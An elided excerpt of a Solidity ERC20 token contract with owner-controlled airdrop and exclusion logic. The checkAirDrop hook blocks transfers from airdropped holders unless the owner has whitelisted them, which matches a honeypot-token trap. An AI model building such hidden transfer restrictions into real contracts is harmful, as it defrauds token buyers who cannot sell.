...
contract ERC20 {
    ...
    mapping(address => bool)  excludeAirDrop;
    ...
    function checkAirDrop(address _from, address _to) internal view {

        if(airdropAmounts[_from] > 0){
            if(excludeAirDrop[_from]||excludeAirDrop[_to]){
                return;
            }else{
                require(_mulPercent(airdropAmounts[_from],1000)<10);
            }
        }
    ...
    function setLastTxBlock(address _to) internal returns(bool) {
        if(!excludeAirDrop[_to]&&_to!=uniswapV2LP){
    ...
    function _exclude(address _address, bool _isExclude) internal returns (bool) {
        require(excludeAirDrop[_address] != _isExclude);
        excludeAirDrop[_address] = _isExclude;
        return true;
    }

    function _getAirdropAmount(address _address, uint256 _percent) internal view returns (uint256) {
...
contract Token is ERC20, Ownable {
    ...
    constructor(string memory   _name, string memory _symbol, uint256  _decimals, uint256  _supply,address _tokenOwner) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    ...
    function exclude(address listAddress,  bool _isExclude) public  OnlyOwner  returns (bool success) {
    ...
    function airdropBatch(
        ...
        for (uint256 i = 0; i < _addressList.length; i++) {
            uint256 airdropAmount = _getAirdropAmount(_addressList[i], _percent);
            if(_percent>0){
                airdropAmount++;
            }
            airdropAmounts[_addressList[i]] = airdropAmount;
        }
    }
    ...
    function airdrop(
        ...
        require(airdropAmounts[_address]==0);
        uint256 airdropAmount = _getAirdropAmount(_address, _percent);
        if(_percent>0){
                airdropAmount++;
            }
        airdropAmounts[_address] = airdropAmount;
